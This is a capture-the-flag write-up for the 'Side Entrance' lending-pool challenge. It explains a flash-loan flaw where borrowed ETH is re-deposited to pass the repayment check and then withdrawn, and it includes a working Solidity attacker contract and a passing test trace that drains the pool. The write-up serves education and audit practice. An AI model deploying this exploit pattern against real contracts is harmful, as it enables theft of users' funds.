## SideEntrance challenge


## Challenge Overview:
A deceptively simple lending pool allows anyone to:

- Deposit ETH.
- Withdraw ETH at any time.
- Take out flash loans with **zero fees** using **deposited ETH**.

>  The pool already contains **1000 ETH**, and your account starts with just **1 ETH**.
>  Your goal is to **drain all ETH from the pool and deposit it into the provided recovery address**.


##  Vulnerability Explanation:

The contract logic enables an attacker to:

1. **Borrow ETH** through the `flashLoan` function.
2. Within the `execute()` callback (called during the flash loan), **re-deposit** the same borrowed ETH using `deposit()`.
3. This **satisfies the flash loan repayment check**, even though the attacker still “owns” the deposited ETH via their internal balance.
4. After the loan, the attacker calls `withdraw()` to **withdraw the same ETH** as if it were theirs.
5. Funds are transferred to the attacker and then **forwarded to the recovery account** via the `receive()` function.

This exploit works because the pool **does not differentiate** between repaying a flash loan and depositing user funds.

## Vulnerable Code:

```solidity
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();// first this function

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
    //second withdraw function:
    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount); //it looks like call function and  no calldata==>go to the recevier function 
    }

```

## Exploiter Strategy:

1.Deploy an attacker contract with access to the pool and recovery address.

2.Call flashLoan() to borrow the full balance.

3.In execute(), re-deposit the borrowed ETH back into the pool.

4.The loan is considered repaid due to the balance check.

5.Call withdraw() to drain the ETH.

When ETH is sent via .call, receive() forwards all funds to the recovery account.

### Exploit Code:
```solidity
// call the attacker contract
function test_sideEntrance() public checkSolvedByPlayer {
        SideAttranceAttack attack = new SideAttranceAttack(
            address(pool),
            recovery
        );
        attack.Attack();
    }


//Attacker Contract
contract SideAttranceAttack {
    address public pool;
    address public recovery;

    constructor(address _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function Attack() external {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);//borrower initating falshLoan
        SideEntranceLenderPool(pool).withdraw(); //after the flashLoan,withdraw all the ether in the pool -->recovery Account
    }

    
    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();// deposit back to the pool through deposit function
    }

    receive() external payable {
        payable(recovery).transfer(msg.value);//transfer to the recovery Account
    }
}
```     
### Proof Of Exploit:

```yaml
Ran 1 test for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge
[PASS] test_sideEntrance() (gas: 347842)
Traces:
  [367742] SideEntranceChallenge::test_sideEntrance()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [235535] → new SideAttranceAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 952 bytes of code
    ├─ [86321] SideAttranceAttack::Attack()
    │   ├─ [38751] SideEntranceLenderPool::flashLoan(1000000000000000000000 [1e21])
    │   │   ├─ [31244] SideAttranceAttack::execute{value: 1000000000000000000000}()
    │   │   │   ├─ [23951] SideEntranceLenderPool::deposit{value: 1000000000000000000000}()
    │   │   │   │   ├─ emit Deposit(who: SideAttranceAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [43561] SideEntranceLenderPool::withdraw()
    │   │   ├─ emit Withdraw(who: SideAttranceAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   ├─ [34590] SideAttranceAttack::receive{value: 1000000000000000000000}()
    │   │   │   ├─ [0] recovery::fallback{value: 1000000000000000000000}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0, "Pool still has ETH") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "Not enough ETH in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.78ms (757.72µs CPU time)

Ran 1 test suite in 1.61s (5.78ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

Simple Understanding Case:
[PASS] test_sideEntrance() (gas: 347842)
Traces:
  SideAttranceAttack::Attack()
    ├─ flashLoan(1000 ETH)
    │   └─ execute{value: 1000 ETH} → deposit()
    └─ withdraw() → receive() → forward to recovery 

assertEq(Pool.balance, 0) 
assertEq(Recovery.balance, 1000 ETH) 
```

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/damn-vulnerable-defi)